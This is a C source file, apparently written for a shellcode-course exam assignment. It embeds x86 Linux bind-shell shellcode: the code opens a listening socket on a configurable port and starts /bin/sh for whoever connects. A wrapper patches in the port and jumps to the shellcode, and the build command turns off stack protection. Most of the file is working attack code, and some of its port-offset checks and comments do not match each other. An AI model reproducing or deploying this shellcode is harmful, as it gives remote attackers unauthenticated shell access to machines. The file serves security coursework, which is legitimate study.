/*
; License: This work is licensed under a Creative Commons
  Attribution-NonCommercial 4.0 International License.
; Filename: bindwrapper.c
; Author:   Muhereza Herbert
; Website:  http://kilobytesecurity.com
;
; Purpose: SLAE Exam requirement Assignment One
; USAGE: 
; 	Edit constant variable 'PORT' to change the port to your preferred value >1024 && <=65535
;	Compile: gcc -m32 -fno-stack-protector -z execstack bindwrapper.c -o bindwrapper
*/


#include <stdio.h>
#include <string.h>
#include <stdbool.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\x43\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x89\xc6\x43\x31\xc0\x50\x66\x68\x9d\xd1\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xb0\x66\xcd\x80\x43\x43\x53\x56\x89\xe1\xb0\x66"
"\xcd\x80\x31\xc0\x43\x50\x50\x56\x89\xe1\xb0\x66\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc0"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2"
"\x53\x89\xe1\xb0\x0b\xcd\x80";

// SET THE PORT HERE
const int PORT = 1026;
//  PORT OFFSET IN SHELLCODE
const int OFFSET = 24;

//Our offset of '\x9d\xd1' in above shellcode is at 25  
static bool check_zeros() {
	// check each byte in shellcode array for hexidecimal zero value, return false if zero found
	int x = 0;
	for(x = 0; x < sizeof(shellcode)-1; x++) {
		if (shellcode[x] == '\x00') return false;
	}
	return true;
}

static bool rport(char *buf, int port) {
	// Check if decimal port is valid
	if (port>65535 || port<1024) { return false; }
	// convert to hex
	*(short *)(buf+OFFSET) = port;
	// Reverse the 2 bytes by swapping
	char tmp = buf[OFFSET];
	buf[OFFSET] = buf[OFFSET+1];
	buf[OFFSET+1] = tmp;
	// Check if the hexidecimal port contains zeroes, if it does then show an error
	if (shellcode[20] == '\x00' || shellcode[21] == '\x00') {
		printf("ERROR: Port in HEX contains zeroes\n"); return false;
	}
	return true;
}

main () {

	if (!rport(shellcode, PORT)) {
		printf("ERROR: Invalid port\n");
		return 0;
	}
	// Print shellcode length.
	printf("Length of Shellcode:  %d\n", strlen(shellcode));
	__asm__ (
	// Clear registers
	"xor %eax, %eax\n\t"
	"xor %ebx, %ebx\n\t"
	"xor %ecx, %ecx\n\t"
	"xor %edx, %edx\n\t"
	"xor %esi, %esi\n\t"
	"xor %ebp, %ebp\n\t"
	// then execute shellcode
	"jmp shellcode");
}
